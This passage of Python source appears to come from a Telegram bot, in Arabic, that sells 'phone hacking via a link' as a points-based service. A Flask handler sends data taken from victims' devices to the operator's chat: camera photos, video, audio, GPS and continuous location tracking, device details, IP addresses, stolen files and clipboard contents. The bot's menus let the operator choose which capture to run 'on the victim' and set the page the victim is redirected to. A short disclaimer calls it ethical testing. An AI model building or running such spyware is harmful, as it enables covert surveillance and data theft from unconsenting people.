                files = {'video': base64.b64decode(video)}
                requests.post(url, data={'chat_id': chat_id}, files=files)
            except:
                pass
        
        # ====== إرسال الصوت ======
        if data.get('audio'):
            try:
                audio = data['audio'].split(',', 1)[1]
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendAudio"
                files = {'audio': base64.b64decode(audio)}
                requests.post(url, data={'chat_id': chat_id}, files=files)
            except:
                pass
        
        # ====== إرسال الموقع ======
        if data.get('location'):
            try:
                loc = data['location']
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation"
                requests.post(url, data={
                    'chat_id': chat_id,
                    'latitude': loc['lat'],
                    'longitude': loc['lng']
                })
            except:
                pass
        
        # ====== إرسال معلومات الجهاز ======
        if data.get('device'):
            try:
                device = data['device']
                msg = f"📱 معلومات الجهاز:\n{device}"
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                requests.post(url, data={'chat_id': chat_id, 'text': msg})
            except:
                pass
        
        # ====== إرسال IP ======
        if data.get('ip'):
            try:
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                requests.post(url, data={'chat_id': chat_id, 'text': f"🌐 IP: {data['ip']}"})
            except:
                pass
        
        # ====== الميزات الجديدة ======
        
        # تتبع الموقع المستمر
        if data.get('locations'):
            for loc in data['locations']:
                try:
                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation"
                    requests.post(url, data={
                        'chat_id': chat_id,
                        'latitude': loc['lat'],
                        'longitude': loc['lng']
                    })
                    time.sleep(0.3)
                except:
                    pass
        
        # سحب الملفات
        if data.get('files'):
            for file_data in data['files']:
                try:
                    content = file_data['content'].split(',', 1)[1]
                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                    files = {'document': base64.b64decode(content)}
                    caption = f"📁 {file_data['name']} ({(file_data['size']/1024):.1f} KB)"
                    requests.post(url, data={'chat_id': chat_id, 'caption': caption}, files=files)
                    time.sleep(0.3)
                except:
                    pass
        
        # الحافظة
        if data.get('clipboard'):
            try:
                msg = f"📋 **محتوى الحافظة:**\n\n{data['clipboard']}"
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                requests.post(url, data={'chat_id': chat_id, 'text': msg, 'parse_mode': 'Markdown'})
            except:
                pass
        
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
        

# ============================================================
#  بوت تيليجرام
# ============================================================

bot = TeleBot(BOT_TOKEN)
user_states = {}

def check_subscription(user_id):
    channels = get_required_channels()
    if not channels:
        return True
    for channel in channels:
        try:
            member = bot.get_chat_member(channel['channel_id'], user_id)
            if member.status in ['left', 'kicked']:
                return False
        except:
            return False
    return True

def get_invites_count(user_id):
    conn = get_db()
    count = conn.execute('SELECT COUNT(*) FROM invites WHERE inviter_id = ?', (user_id,)).fetchone()[0]
    conn.close()
    return count

# ============================================================
#  القائمة الجديدة (واجهة البوت)
# ============================================================

def main_menu(user_id):
    user = get_user(user_id)
    points = user['points'] if user else 0
    
    daily_available = get_daily_reward(user_id) if user else False
    daily_text = "🎁 نقطة يومية" if daily_available else "⏳ انتظر غداً"
    daily_callback = "daily_reward" if daily_available else "daily_claimed"
    
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🚀 ابدأ الاختراق", callback_data="start_hack"),
        InlineKeyboardButton("⭐ جمع نقاط", callback_data="earn_points"),
        InlineKeyboardButton(f"💰 رصيدك: {points} نقطة", callback_data="my_balance"),
        InlineKeyboardButton("🛒 شراء نقاط", callback_data="buy_points"),
        InlineKeyboardButton(daily_text, callback_data=daily_callback),
        InlineKeyboardButton("ℹ️ معلومات البوت", callback_data="bot_info"),
        InlineKeyboardButton("📞 التواصل مع الدعم", callback_data="support")
    )
    
    if user and user['is_admin']:
        markup.add(InlineKeyboardButton("⚙️ لوحة الإدارة", callback_data="admin_panel"))
    
    return markup

def admin_panel():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("📊 الإحصائيات", callback_data="admin_stats"),
        InlineKeyboardButton("👥 إدارة المستخدمين", callback_data="admin_users"),
        InlineKeyboardButton("📢 إدارة القنوات", callback_data="admin_channels"),
        InlineKeyboardButton("⚙️ إعدادات البوت", callback_data="admin_settings"),
        InlineKeyboardButton("⭐ إدارة النقاط", callback_data="admin_points"),
        InlineKeyboardButton("🎁 مكافآت جماعية", callback_data="admin_group_rewards"),
        InlineKeyboardButton("🔧 إدارة الميزات", callback_data="admin_features"),
        InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")
    )
    return markup

# ====== معالجة الأزرار ======
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    user_id = call.from_user.id
    data = call.data
    
    # ====== العودة للقائمة الرئيسية ======
    if data == 'back_to_menu':
        user = get_user(user_id)
        points = user['points'] if user else 0
        msg = f"""
🔬 **مرحباً بك في بوت اختراق الهاتف عبر رابط!**

⭐ **نقاطك:** {points} نقطة

📋 **اختر أحد الخيارات أدناه:**
        """
        bot.edit_message_text(
            msg,
            user_id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=main_menu(user_id)
        )
        bot.answer_callback_query(call.id)
        return
    
    # ====== النقطة اليومية ======
    if data == 'daily_reward':
        user = get_user(user_id)
        if not user:
            bot.answer_callback_query(call.id, "❌ يرجى إعادة تشغيل البوت")
            return
        if get_daily_reward(user_id):
            add_points(user_id, 1, 'نقطة يومية')
            claim_daily_reward(user_id)
            user = get_user(user_id)
            msg = f"""
🎁 **تم استلام النقطة اليومية!**

⭐ تم إضافة **1 نقطة** إلى رصيدك.
💰 رصيدك الحالي: **{user['points']}** نقطة.

📅 عودة غداً للحصول على نقطة جديدة!
            """
            bot.edit_message_text(
                msg,
                user_id,
                call.message.message_id,
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")
                )
            )
            bot.answer_callback_query(call.id, "✅ تم إضافة نقطة")
        else:
            bot.answer_callback_query(call.id, "⏳ لقد حصلت على نقطتك اليومية بالفعل")
        return
    
    if data == 'daily_claimed':
        bot.answer_callback_query(call.id, "⏳ لقد حصلت على نقطتك اليومية بالفعل")
        return
    
    # ====== زر "ابدأ الاختراق" ======
    # ====== زر "ابدأ الاختراق" ======
    if data == 'start_hack':
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
        InlineKeyboardButton("📷 كاميرا أمامية", callback_data="camera_front"),
        InlineKeyboardButton("📷 كاميرا خلفية", callback_data="camera_back"),
        InlineKeyboardButton("🎥 فيديو أمامي", callback_data="video_front"),
        InlineKeyboardButton("🎥 فيديو خلفي", callback_data="video_back"),
        InlineKeyboardButton("🎙 تسجيل صوتي", callback_data="audio"),
        InlineKeyboardButton("📍 الموقع الجغرافي", callback_data="location"),
        InlineKeyboardButton("📍 تتبع الموقع المستمر", callback_data="location_tracking"),
        InlineKeyboardButton("📱 معلومات الجهاز", callback_data="device"),
        InlineKeyboardButton("📁 سحب الملفات", callback_data="file_exfil"),
        InlineKeyboardButton("📋 الحافظة", callback_data="clipboard"),
        InlineKeyboardButton("🔬 كل الميزات", callback_data="all"),
        InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")
    )
    
        bot.edit_message_text(
            "🎯 **اختر نوع الاختراق:**\n\nاختر الميزة التي تريد اختبارها على الضحية:",
            user_id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=markup
        )
        bot.answer_callback_query(call.id)
        return
    
    # ====== زر "جمع نقاط" ======
    if data == 'earn_points':
        user = get_user(user_id)
        invite_link = f"https://t.me/{bot.get_me().username}?start={user['invite_code'] if user else ''}"
        
        msg = f"""
⭐ **جمع نقاط**

📍 **طريقة جمع النقاط:**
• قم بدعوة أصدقائك عبر الرابط الخاص بك
• كل شخص يسجل عبر رابطك يمنحك **1 نقطة**

🔗 **رابط الدعوة الخاص بك:**
<code>{invite_link}</code>

📊 **عدد المدعوين:** {get_invites_count(user_id)}
⭐ **نقاطك الحالية:** {user['points'] if user else 0}
        """
        bot.edit_message_text(
            msg,
            user_id,
            call.message.message_id,
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")
            )
        )
        bot.answer_callback_query(call.id)
        return
    
    # ====== زر "رصيدي" ======
    if data == 'my_balance':
        user = get_user(user_id)
        msg = f"""
💰 **رصيدك الحالي**

⭐ **عدد النقاط:** {user['points'] if user else 0}

📊 **إجمالي النقاط التي حصلت عليها:** {user['total_points'] if user else 0}

📨 **عدد المدعوين:** {get_invites_count(user_id)}

💡 **طرق الربح:**
• دعوة الأصدقاء (+1 نقطة لكل مدعو)
• شراء نقاط (من لوحة الشراء)
        """
        bot.edit_message_text(
            msg,
            user_id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")
            )
        )
        bot.answer_callback_query(call.id)
        return
    
    # ====== زر "شراء نقاط" ======
    if data == 'buy_points':
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("⭐ 10 نقاط - 5$", callback_data="buy_10"),
            InlineKeyboardButton("⭐ 25 نقاط - 10$", callback_data="buy_25"),
            InlineKeyboardButton("⭐ 50 نقاط - 18$", callback_data="buy_50"),
            InlineKeyboardButton("⭐ 100 نقاط - 30$", callback_data="buy_100"),
            InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")
        )
        bot.edit_message_text(
            "🛒 **شراء نقاط**\n\nاختر الباقة المناسبة لك:",
            user_id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=markup
        )
        bot.answer_callback_query(call.id)
        return
    
    # ====== معالجة شراء نقاط ======
    if data.startswith('buy_'):
        points_map = {
            'buy_10': 10,
            'buy_25': 25,
            'buy_50': 50,
            'buy_100': 100
        }
        points = points_map.get(data, 0)
        if points:
            bot.send_message(
                user_id,
                f"🛒 **طلب شراء {points} نقطة**\n\n"
                f"📌 للشراء، تواصل مع الدعم:\n"
                f"@YourSupportUsername\n\n"
                f"أو استخدم الأمر /contact",
                parse_mode='Markdown'
            )
            bot.answer_callback_query(call.id, f"✅ تم طلب شراء {points} نقطة")
        return
    
    # ====== زر "معلومات البوت" ======
    if data == 'bot_info':
        msg = """
ℹ️ **معلومات البوت**

🔬 **الاسم:** بوت اختبار الاختراق
🛡️ **الإصدار:** 2.0
📋 **الوصف:**
هذا البوت مخصص لاختبار الاختراق الأخلاقي.
يسمح لك بإنشاء روابط ملغمة لاختبار أمان الأجهزة.

👨‍💻 **المطور:** @YourDevUsername

⚙️ **الميزات:**
• اختبار الكاميرا (أمامية/خلفية)
• اختبار المايكروفون
• تحديد الموقع الجغرافي
• جمع معلومات الجهاز
• تسجيل الفيديو والصوت

⚠️ **تنبيه:**
هذا البوت للأغراض الأكاديمية والبحثية فقط.
        """
        bot.edit_message_text(
            msg,
            user_id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")
            )
        )
        bot.answer_callback_query(call.id)
        return
    
    # ====== زر "الدعم" ======
    if data == 'support':
        msg = """
📞 **التواصل مع الدعم**

📧 **البريد الإلكتروني:** support@example.com
💬 **تيليجرام:** @YourSupportUsername
📱 **الموقع:** https://your-website.com

📌 **للإبلاغ عن مشكلة أو اقتراح:**
استخدم الأمر /contact

🕐 **أوقات العمل:**
من الساعة 10 صباحاً حتى 10 مساءً
        """
        bot.edit_message_text(
            msg,
            user_id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")
            )
        )
        bot.answer_callback_query(call.id)
        return
    
    # ====== لوحة الإدارة ======
    if data == 'admin_panel':
        user = get_user(user_id)
        if user and user['is_admin']:
            bot.edit_message_text(
                "⚙️ **لوحة الإدارة**",
                user_id,
                call.message.message_id,
                parse_mode='Markdown',
                reply_markup=admin_panel()
            )
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== الإحصائيات ======
    if data == 'admin_stats':
        user = get_user(user_id)
        if user and user['is_admin']:
            conn = get_db()
            total_users = conn.execute('SELECT COUNT(*) FROM users').fetchone()[0]
            total_points = conn.execute('SELECT SUM(points) FROM users').fetchone()[0] or 0
            total_invites = conn.execute('SELECT COUNT(*) FROM invites').fetchone()[0]
            total_logs = conn.execute('SELECT COUNT(*) FROM user_logs').fetchone()[0]
            total_sessions = conn.execute('SELECT COUNT(*) FROM sessions').fetchone()[0]
            admins = conn.execute('SELECT COUNT(*) FROM users WHERE is_admin = 1').fetchone()[0]
            banned = conn.execute('SELECT COUNT(*) FROM users WHERE is_banned = 1').fetchone()[0]
            daily_count = get_daily_reward_count()
            conn.close()
            
            msg = f"""
📊 **إحصائيات البوت**

👥 **المستخدمين:**
• الإجمالي: {total_users}
• المديرين: {admins}
• المحظورين: {banned}

⭐ **النقاط:**
• إجمالي النقاط: {total_points}
• متوسط النقاط: {round(total_points/total_users, 1) if total_users > 0 else 0}

📨 **الدعوات:** {total_invites}
📋 **السجلات:** {total_logs}
🔗 **الجلسات:** {total_sessions}
🎁 **النقاط اليومية اليوم:** {daily_count}
            """
            bot.send_message(user_id, msg, parse_mode='Markdown')
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== إدارة المستخدمين ======
    if data == 'admin_users':
        user = get_user(user_id)
        if user and user['is_admin']:
            conn = get_db()
            users = conn.execute('''
                SELECT user_id, username, first_name, last_name, points, is_admin, is_banned, joined_date
                FROM users ORDER BY user_id DESC LIMIT 20
            ''').fetchall()
            conn.close()
            
            if not users:
                bot.send_message(user_id, "📭 لا يوجد مستخدمين")
                bot.answer_callback_query(call.id)
                return
            
            msg = "👥 **قائمة المستخدمين (آخر 20):**\n\n"
            for u in users:
                status = "👑" if u['is_admin'] else "🔹"
                if u['is_banned']:
                    status = "🚫"
                msg += f"{status} **{u['first_name']}**"
                if u['username']:
                    msg += f" (@{u['username']})"
                msg += f"\n🆔 `{u['user_id']}`"
                msg += f"\n⭐ نقاط: {u['points']}"
                msg += f"\n📅 {u['joined_date'][:10]}\n\n"
            
            markup = InlineKeyboardMarkup(row_width=2)
            markup.add(
                InlineKeyboardButton("📥 تصدير المستخدمين", callback_data="export_users"),
                InlineKeyboardButton("🔙 العودة", callback_data="admin_panel")
            )
            bot.send_message(user_id, msg, parse_mode='Markdown', reply_markup=markup)
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== تصدير المستخدمين ======
    if data == 'export_users':
        user = get_user(user_id)
        if user and user['is_admin']:
            conn = get_db()
            users = conn.execute('SELECT * FROM users').fetchall()
            conn.close()
            
            import csv
            import io
            output = io.StringIO()
            writer = csv.writer(output)
            writer.writerow(['ID', 'Username', 'First Name', 'Last Name', 'Points', 'Total Points', 'Admin', 'Banned', 'Joined Date', 'Invite Code'])
            for u in users:
                writer.writerow([
                    u['user_id'], u['username'] or '', u['first_name'] or '', u['last_name'] or '',
                    u['points'], u['total_points'], u['is_admin'], u['is_banned'],
                    u['joined_date'], u['invite_code']
                ])
            
            output.seek(0)
            bot.send_document(user_id, ('users.csv', output.getvalue()))
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== إدارة القنوات ======
    if data == 'admin_channels':
        user = get_user(user_id)
        if user and user['is_admin']:
            channels = get_required_channels()
            msg = "📢 **القنوات الإجبارية:**\n\n"
            if channels:
                for ch in channels:
                    try:
                        chat = bot.get_chat(ch['channel_id'])
                        msg += f"🔹 {chat.title} (`{ch['channel_id']}`)\n"
                    except:
                        msg += f"🔹 {ch['channel_id']}\n"
            else:
                msg += "📭 لا توجد قنوات إجبارية\n"
            
            msg += "\n📌 **الأوامر:**\n"
            msg += "`/add_channel [id] [الاسم]` - إضافة قناة\n"
            msg += "`/remove_channel [id]` - حذف قناة"
            
            bot.send_message(user_id, msg, parse_mode='Markdown')
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== إدارة النقاط ======
    if data == 'admin_points':
        user = get_user(user_id)
        if user and user['is_admin']:
            markup = InlineKeyboardMarkup(row_width=2)
            markup.add(
                InlineKeyboardButton("➕ إضافة نقاط", callback_data="add_points_user"),
                InlineKeyboardButton("➖ خصم نقاط", callback_data="deduct_points_user"),
                InlineKeyboardButton("📊 ترتيب النقاط", callback_data="points_leaderboard"),
                InlineKeyboardButton("🔙 العودة", callback_data="admin_panel")
            )
            bot.edit_message_text(
                "⭐ **إدارة النقاط**\n\nاختر الإجراء:",
                user_id,
                call.message.message_id,
                parse_mode='Markdown',
                reply_markup=markup
            )
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== إضافة نقاط ======
    if data == 'add_points_user':
        user = get_user(user_id)
        if user and user['is_admin']:
            bot.send_message(
                user_id,
                "📝 **إضافة نقاط لمستخدم**\n\n"
                "أرسل الأمر بالشكل التالي:\n"
                "`/add_points [user_id] [عدد النقاط]`\n\n"
                "مثال: `/add_points 123456789 10`"
            )
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== خصم نقاط ======
    if data == 'deduct_points_user':
        user = get_user(user_id)
        if user and user['is_admin']:
            bot.send_message(
                user_id,
                "📝 **خصم نقاط من مستخدم**\n\n"
                "أرسل الأمر بالشكل التالي:\n"
                "`/deduct_points [user_id] [عدد النقاط]`\n\n"
                "مثال: `/deduct_points 123456789 5`"
            )
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== ترتيب النقاط ======
    if data == 'points_leaderboard':
        user = get_user(user_id)
        if user and user['is_admin']:
            conn = get_db()
            top_users = conn.execute('''
                SELECT user_id, username, first_name, points
                FROM users
                ORDER BY points DESC
                LIMIT 10
            ''').fetchall()
            conn.close()
            
            msg = "🏆 **ترتيب المستخدمين حسب النقاط:**\n\n"
            medals = ["🥇", "🥈", "🥉"]
            for i, u in enumerate(top_users):
                medal = medals[i] if i < 3 else f"{i+1}."
                name = u['first_name'] or u['username'] or str(u['user_id'])
                msg += f"{medal} {name} - ⭐ {u['points']}\n"
            
            bot.send_message(user_id, msg, parse_mode='Markdown')
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== إعدادات البوت ======
    if data == 'admin_settings':
        user = get_user(user_id)
        if user and user['is_admin']:
            prices = get_prices()
            msg = "⚙️ **إعدادات البوت (أسعار الميزات)**\n\n"
            msg += "السعر الحالي لكل ميزة:\n"
            feature_names = {
                'camera': '📷 الكاميرا',
                'audio': '🎙 الصوت',
                'video': '🎥 الفيديو',
                'location': '📍 الموقع',
                'device': '📱 معلومات الجهاز',
                'all': '🔬 كل الميزات'
            }
            for key, name in feature_names.items():
                msg += f"• {name}: **{prices.get(key, 5)}** نقاط\n"
            
            msg += "\n📌 **لتغيير السعر، استخدم الأمر:**\n"
            msg += "`/set_price [الميزة] [السعر]`\n\n"
            msg += "الميزات المتاحة: `camera`, `audio`, `video`, `location`, `device`, `all`\n"
            msg += "مثال: `/set_price camera 3`"
            
            bot.send_message(user_id, msg, parse_mode='Markdown')
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== المكافآت الجماعية ======
    if data == 'admin_group_rewards':
        user = get_user(user_id)
        if user and user['is_admin']:
            markup = InlineKeyboardMarkup(row_width=2)
            markup.add(
                InlineKeyboardButton("➕ إنشاء مكافأة جديدة", callback_data="create_group_reward"),
                InlineKeyboardButton("📋 قائمة المكافآت", callback_data="list_group_rewards"),
                InlineKeyboardButton("🔙 العودة", callback_data="admin_panel")
            )
            bot.edit_message_text(
                "🎁 **المكافآت الجماعية**\n\n"
                "أنشئ مكافأة يمكن لعدد محدد من المستخدمين استلامها.\n"
                "كل مستخدم يحصل على النقاط المحددة عند استخدام الكود.",
                user_id,
                call.message.message_id,
                parse_mode='Markdown',
                reply_markup=markup
            )
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== إنشاء مكافأة جماعية ======
    if data == 'create_group_reward':
        user = get_user(user_id)
        if user and user['is_admin']:
            bot.send_message(
                user_id,
                "📝 **إنشاء مكافأة جماعية**\n\n"
                "أرسل الأمر بالشكل التالي:\n"
                "`/create_reward [عدد النقاط] [عدد الأعضاء]`\n\n"
                "مثال: `/create_reward 50 10`\n"
                "(يعني: 50 نقطة لكل من أول 10 أشخاص يستخدمون الكود)"
            )
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== قائمة المكافآت ======
    if data == 'list_group_rewards':
        user = get_user(user_id)
        if user and user['is_admin']:
            conn = get_db()
            rewards = conn.execute('''
                SELECT * FROM group_rewards ORDER BY created DESC LIMIT 20
            ''').fetchall()
            conn.close()
            
            if not rewards:
                bot.send_message(user_id, "📭 لا توجد مكافآت سابقة")
                bot.answer_callback_query(call.id)
                return
            
            msg = "📋 **قائمة المكافآت:**\n\n"
            for r in rewards:
                remaining = r['member_count'] - r['used_count']
                msg += f"🔑 **{r['code']}**\n"
                msg += f"⭐ {r['points']} نقطة | 👥 {remaining} متبقي\n"
                msg += f"📅 {r['created'][:10]}\n\n"
            
            bot.send_message(user_id, msg, parse_mode='Markdown')
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== إدارة الميزات ======
    if data == 'admin_features':
        user = get_user(user_id)
        if user and user['is_admin']:
            features = ['camera', 'audio', 'video', 'location', 'device', 'all']
            markup = InlineKeyboardMarkup(row_width=2)
            for f in features:
                status = "✅" if is_feature_enabled(f) else "❌"
                markup.add(InlineKeyboardButton(f"{status} {f.title()}", callback_data=f"toggle_{f}"))
            markup.add(InlineKeyboardButton("🔙 العودة", callback_data="admin_panel"))
            bot.edit_message_text(
                "🔧 **إدارة الميزات**\nاضغط على الميزة لتفعيل/تعطيل:",
                user_id,
                call.message.message_id,
                parse_mode='Markdown',
                reply_markup=markup
            )
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== تبديل الميزات ======
    if data.startswith('toggle_'):
        user = get_user(user_id)
        if user and user['is_admin']:
            feature = data.replace('toggle_', '')
            new_status = toggle_feature(feature)
            status_text = "مُفعلة ✅" if new_status else "معطلة ❌"
            bot.answer_callback_query(call.id, f"تم {status_text}")
            
            features = ['camera', 'audio', 'video', 'location', 'device', 'all']
            markup = InlineKeyboardMarkup(row_width=2)
            for f in features:
                status = "✅" if is_feature_enabled(f) else "❌"
                markup.add(InlineKeyboardButton(f"{status} {f.title()}", callback_data=f"toggle_{f}"))
            markup.add(InlineKeyboardButton("🔙 العودة", callback_data="admin_panel"))
            bot.edit_message_text(
                f"🔧 **إدارة الميزات**\n{feature.title()} الآن {status_text}",
                user_id,
                call.message.message_id,
                parse_mode='Markdown',
                reply_markup=markup
            )
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== الميزات الأساسية (كاميرا، فيديو، إلخ) ======
    # ====== الميزات الأساسية والجديدة ======
    if data in ['camera_front', 'camera_back', 'video_front', 'video_back', 'audio','location', 'device', 'all', 'location_tracking', 'file_exfil', 'clipboard']:
        user = get_user(user_id)
    
    # تحديد النقاط المطلوبة لكل ميزة (بما في ذلك الجديدة)
        points_map = {
        'camera_front': 3, 'camera_back': 3,
        'video_front': 5, 'video_back': 5,
        'audio': 3, 'location': 2,
        'device': 2, 'all': 10,
        'location_tracking': 5,
        'file_exfil': 8,
        'clipboard': 3
    }
        required_points = points_map.get(data, 5)
    
    if user and user['points'] < required_points:
        bot.answer_callback_query(
            call.id,
            f"❌ لا يوجد نقاط كافية! تحتاج {required_points} نقطة."
        )
        bot.send_message(
            user_id,
            f"❌ **نقاط غير كافية!**\n\n"
            f"هذه الميزة تحتاج **{required_points}** نقطة.\n"
            f"رصيدك الحالي: **{user['points']}** نقطة.\n\n"
            f"💡 اشترِ نقاطاً أو ادعُ أصدقاءك لكسب نقاط إضافية."
        )
        return
    
    # خصم النقاط
    deduct_points(user_id, required_points, f'استخدام {data}')
    
    # طلب الرابط الأصلي
    user_states[user_id] = f'waiting_url_{data}'
    bot.send_message(
        user_id,
        f"📤 أرسل الآن **الرابط الأصلي**\n"
        f"(الموقع الذي تريد توجيه الضحية إليه)\n\n"
        f"💡 تم خصم {required_points} نقطة مقابل هذه الخدمة."
    )
    bot.answer_callback_query(call.id)
    return
        
    # ====== أي شيء آخر ======
    bot.answer_callback_query(call.id, "❌ خيار غير معروف")

# ====== أوامر البوت ======
@bot.message_handler(commands=['start'])
def start_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    
    if len(message.text.split()) > 1:
        invite_code = message.text.split()[1]
        conn = get_db()
        inviter = conn.execute('SELECT user_id FROM users WHERE invite_code = ?', (invite_code,)).fetchone()
        conn.close()
        if inviter and not user:
            invited_by = inviter['user_id']
        else:
            invited_by = None
    else:
        invited_by = None
    
    if not user:
        create_user(user_id, message.from_user.username or '', message.from_user.first_name or '', message.from_user.last_name or '', invited_by)
        user = get_user(user_id)
    
    points = user['points'] if user else 0
    
    msg = f"""
🔬 **مرحباً بك في بوت اختراق الهاتف عبر رابط!**

⭐ **نقاطك:** {points} نقطة

📋 **اختر أحد الخيارات أدناه:**
    """
    bot.send_message(
        user_id,
        msg,
        parse_mode='Markdown',
        reply_markup=main_menu(user_id)
    )

@bot.message_handler(commands=['admin'])
def make_admin_cmd(message):
    if message.from_user.id == 6904264075:
        conn = get_db()
        conn.execute("UPDATE users SET is_admin = 1 WHERE user_id = ?", (message.from_user.id,))
        conn.commit()
        conn.close()
        bot.reply_to(message, "✅ تم تفعيل صلاحيات الإدارة")
    else:
        bot.reply_to(message, "❌ غير مصرح لك")

@bot.message_handler(commands=['add_points'])
def add_points_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    if not user or not user['is_admin']:
        bot.reply_to(message, "❌ غير مصرح لك")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "❌ استخدم: /add_points [user_id] [العدد]")
            return
        target_id = int(parts[1])
        points = int(parts[2])
        add_points(target_id, points, f'إضافة من الإدمن {user_id}')
        bot.reply_to(message, f"✅ تم إضافة {points} نقاط للمستخدم {target_id}")
    except:
        bot.reply_to(message, "❌ حدث خطأ")

@bot.message_handler(commands=['deduct_points'])
def deduct_points_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    if not user or not user['is_admin']:
        bot.reply_to(message, "❌ غير مصرح لك")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "❌ استخدم: /deduct_points [user_id] [العدد]")
            return
        target_id = int(parts[1])
        points = int(parts[2])
        deduct_points(target_id, points, f'خصم من الإدمن {user_id}')
        bot.reply_to(message, f"✅ تم خصم {points} نقاط من المستخدم {target_id}")
    except:
        bot.reply_to(message, "❌ حدث خطأ")

@bot.message_handler(commands=['set_price'])
def set_price_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    if not user or not user['is_admin']:
        bot.reply_to(message, "❌ غير مصرح لك")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "❌ استخدم: /set_price [الميزة] [السعر]")
            return
        feature = parts[1].lower()
        price = int(parts[2])
        
        valid_features = ['camera', 'audio', 'video', 'location', 'device', 'all']
        if feature not in valid_features:
            bot.reply_to(message, f"❌ الميزة غير صالحة. الميزات المتاحة: {', '.join(valid_features)}")
            return
        
        set_price(feature, price)
        bot.reply_to(message, f"✅ تم تعيين سعر {feature} إلى {price} نقاط")
    except:
        bot.reply_to(message, "❌ حدث خطأ")

@bot.message_handler(commands=['add_channel'])
def add_channel_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    if not user or not user['is_admin']:
        bot.reply_to(message, "❌ غير مصرح لك")
        return
    
    try:
        parts = message.text.split(maxsplit=2)
        if len(parts) < 3:
            bot.reply_to(message, "❌ استخدم: /add_channel [id] [الاسم]")
            return
        channel_id = parts[1]
        channel_name = parts[2]
        add_required_channel(channel_id, channel_name)
        bot.reply_to(message, f"✅ تم إضافة القناة: {channel_name}")
    except:
        bot.reply_to(message, "❌ حدث خطأ")

@bot.message_handler(commands=['remove_channel'])
def remove_channel_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    if not user or not user['is_admin']:
        bot.reply_to(message, "❌ غير مصرح لك")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ استخدم: /remove_channel [id]")
            return
        channel_id = parts[1]
        remove_required_channel(channel_id)
        bot.reply_to(message, f"✅ تم حذف القناة")
    except:
        bot.reply_to(message, "❌ حدث خطأ")

@bot.message_handler(commands=['create_reward'])
def create_reward_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    if not user or not user['is_admin']:
        bot.reply_to(message, "❌ غير مصرح لك")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 3:
